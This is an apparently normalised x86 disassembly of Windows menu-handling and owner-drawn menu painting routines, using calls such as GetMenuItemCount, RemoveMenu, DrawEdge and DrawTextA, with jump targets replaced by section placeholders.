mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_448ddc
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_448cac
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_448ddc
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_448ddc
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_448b6c
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebp
call sub_448ddc
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_448d7c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44a848
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44a858
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44a858
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44a858
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_447e84
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_448ddc
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_448b6c
mov eax [ rw-data ]
call sub_447e84
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_448e28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194c4
push ebx
push sub_448bdc
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_448e6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_449050
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44ae04
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404028
test bh 0x4
je r-xdata
mov eax edi
call sub_44c440
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40439c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cacc
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404258
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c4a4
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c4b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449057
lea eax [ ebp - 0xc ]
call sub_403f90
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404250
push eax
mov eax [ ebp - 0xc ]
call sub_404450
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c1e4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404250
push eax
mov eax [ ebp - 0xc ]
call sub_404450
push eax
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c1e4
mov eax 0xff00000d
call sub_41bd24
mov esi eax
mov eax 0xff000010
call sub_41bd24
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c1e4
jmp r-xdata
sub_4490bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4499a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41c9b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c1e4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40439c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41c9b0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_445e80
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41c9b0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_449503
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_420cf8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c1e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_445e80
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41c9b0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_421cfc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c984
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d160
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_446170
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c9b0
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_448e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c4b0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41cf68
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c1e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403258
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d438
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_448e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4499ab
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_447f30
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_448e6c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4499c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44a2cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d014
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41c9b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c1e4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
